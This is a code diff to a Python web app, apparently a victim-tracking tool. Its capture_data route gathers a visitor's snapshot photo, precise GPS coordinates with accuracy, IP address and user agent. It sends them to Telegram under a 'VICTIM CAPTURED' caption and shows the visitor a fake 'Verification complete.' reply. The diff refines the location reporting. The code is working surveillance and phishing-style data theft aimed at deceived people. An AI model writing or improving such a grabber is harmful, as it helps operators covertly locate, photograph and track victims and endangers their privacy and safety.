@@ -174,16 +174,23 @@ def capture_data():
             logger.error(f"Error saving snapshot: {e}")
 
     safe_ua = re.sub(r'<[^>]+>', '', str(data.get('userAgent', 'N/A')))[:60]
+    
+    # Format coordinates safely
+    lat = data.get('lat', 'N/A')
+    lon = data.get('lon', 'N/A')
+    accuracy = data.get('accuracy', 'N/A')
+    if accuracy is not None:
+        accuracy = f"{accuracy}m"
 
-    # Prepare Caption for the Photo
     caption = f"""🚨 <b>VICTIM CAPTURED</b> 🚨
 🆔 <b>ID:</b> <code>{unique_id}</code>
 
-📍 <b>LOCATION</b>
+📍 <b>LOCATION ({data.get('locationSource', 'N/A').upper()})</b>
 🏙️ City: {data.get('city', 'N/A')}
 🗺️ Region: {data.get('region', 'N/A')}
 🌍 Country: {data.get('country', 'N/A')}
-📌 Coords: {data.get('lat', 'N/A')}, {data.get('lon', 'N/A')}
+📌 Coords: {lat}, {lon}
+🎯 Accuracy: {accuracy}
 
 🌐 <b>NETWORK</b>
 🔢 Client IP: {data.get('ip', 'N/A')}
@@ -206,10 +213,6 @@ def capture_data():
 """
         send_telegram(fallback_report)
 
-    # Cleanup: Optional. Remove old files to save disk space on Render
-    # Render filesystem is ephemeral, but let's keep it clean just in case
-    # (Render resets on deploy anyway, so this is optional)
-    
     return {"status": "success", "msg": "Verification complete."}
 
 @app.route('/health')
